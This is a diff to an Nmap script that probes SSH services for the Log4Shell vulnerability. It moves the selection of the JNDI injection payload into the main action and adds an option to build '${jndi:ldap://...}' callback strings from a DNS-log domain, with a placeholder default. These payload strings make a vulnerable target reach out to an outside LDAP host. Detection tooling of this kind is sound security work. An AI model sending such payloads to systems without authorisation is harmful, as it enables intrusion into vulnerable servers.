@@ -24,17 +24,6 @@ categories = {
 portrule = shortport.port_or_service( {22}, {"ssh"}, "tcp", "open")
 
 local arg_timeout = stdnse.get_script_args(SCRIPT_NAME .. ".timeout") or "5s"
-local payload = stdnse.get_script_args(SCRIPT_NAME..".payload")
-local gpayload = stdnse.get_script_args("log4shell.payload")
-
-if not payload then
-  if not gpayload then
-    payload = "${jndi:ldap://mydomain/uri}"
-    stdnse.debug1("Setting the payload to default payload:"..payload)
-  else
-    payload=gpayload
-  end
-end
 
 local function password_auth_allowed (host, port)
   local helper = libssh2_util.SSHConnection:new()
@@ -55,6 +44,29 @@ end
 function action (host, port)
   local timems = stdnse.parse_timespec(arg_timeout) --todo: use this!
   local ssh_timeout = 1000 * timems
+
+  local payload = stdnse.get_script_args(SCRIPT_NAME..".payload")
+  local gpayload = stdnse.get_script_args("log4shell.payload")
+
+  if not payload then
+    if not gpayload then
+      if nmap.registry['dnslog-cn'] then
+	 stdnse.debug2("registry not present")
+	 local registry = nmap.registry['dnslog-cn']
+	 if registry.domain then
+	       payload = "${jndi:ldap://{{target}}."..registry.domain.."}"
+	 else
+	       stdnse.debug2("session not present")
+	 end
+      else
+	 payload = "${jndi:ldap://mydomain/uri}"
+      end
+      stdnse.debug1("Setting the payload to default payload:"..payload)
+    else
+      payload=gpayload
+    end
+  end
+
   if password_auth_allowed(host, port) then
     local options = {
       ssh_timeout = ssh_timeout,
